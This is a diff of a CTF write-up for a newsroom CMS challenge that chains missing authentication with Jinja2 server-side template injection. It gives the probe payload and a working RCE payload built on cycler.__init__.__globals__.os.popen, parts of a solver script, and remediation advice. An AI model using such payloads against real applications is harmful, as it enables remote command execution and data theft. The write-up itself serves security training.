@@ -1,39 +1,13 @@
-<div align="center">
-
 # Technical Write-Up: CMS Newsroom (Broken Access Control & Jinja2 SSTI to RCE)
 
-</div>
-
-<div align="center">
-
-[![Platform](https://img.shields.io/badge/Platform-InvataCyber.ro-blue.svg?style=flat&logo=target)](#)
-[![Category](https://img.shields.io/badge/Category-Web%20%7C%20Server--Side-orange.svg?style=flat&logo=python)](#)
-[![Vulnerability](https://img.shields.io/badge/CWE-CWE--1336%20%2F%20CWE--306-red.svg?style=flat)](#)
-[![Impact](https://img.shields.io/badge/Impact-Remote%20Code%20Execution%20(RCE)-critical.svg?style=flat)](#)
-[![Author](https://img.shields.io/badge/Author-Moan%C4%83%20%C8%98tef%C4%83nu%C8%9B--Cornel-blue.svg?style=flat&logo=github)](https://github.com/stefanutc1)
-
-</div>
-
----
-
-<div align="center">
-
 ## 1. Challenge Specification
-
-</div>
 
 - **Target Application**: Newly migrated newsroom content management system (CMS).
 - **Flaw Context**: Single Sign-On (SSO) authentication middleware was erroneously omitted from editorial management routes, allowing unauthenticated visitors to create and edit articles. Article content is evaluated by the server before rendering.
 - **Flag Location**: `/flag.txt`
 - **Flag Format**: `InvataCyber{...}`
 
----
-
-<div align="center">
-
 ## 2. Attack Surface Analysis & Root Cause
-
-</div>
 
 The challenge presents two chained vulnerabilities:
 
@@ -42,13 +16,7 @@ The challenge presents two chained vulnerabilities:
 2. **Server-Side Template Injection ([CWE-1336](https://cwe.mitre.org/data/definitions/1336.html))**:  
    The backend improperly utilizes `render_template_string()` in Python Flask/Jinja2, concatenating user-controlled article content directly into the template string rather than passing it as a template context variable.
 
----
-
-<div align="center">
-
 ## 3. Template Engine Fingerprinting
-
-</div>
 
 Submitting mathematical expression payloads into article content via `POST /edit/5`:
 - **Initial Probe**: `{{ 7 * 7 }}`  
@@ -61,13 +29,7 @@ Submitting mathematical expression payloads into article content via `POST /edit
 
 This confirmed an active **Jinja2 / Python** templating engine without sandbox isolation.
 
----
-
-<div align="center">
-
 ## 4. Sandbox Escape & Remote Code Execution (RCE)
-
-</div>
 
 In Jinja2 on Python 3, access to underlying Python objects is achievable via the method resolution order (`__mro__`):
 
@@ -84,13 +46,7 @@ In Jinja2 on Python 3, access to underlying Python objects is achievable via the
    {{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
    ```
 
----
-
-<div align="center">
-
 ## 5. Automated Python Solver (`blog_flag.py`)
-
-</div>
 
 ```python
 #!/usr/bin/env python3
@@ -116,13 +72,7 @@ if flag:
     print(f"[+] Flag Extracted: {flag.group(0)}")
 ```
 
----
-
-<div align="center">
-
 ## 6. Remediation & Hardening Recommendations
-
-</div>
 
 1. **Enforce Authentication Middleware**: Apply mandatory SSO/OAuth2-Proxy authentication wrappers across all administrative and editorial routes.
 2. **Eliminate `render_template_string`**: Use static templates with explicit context parameter binding:
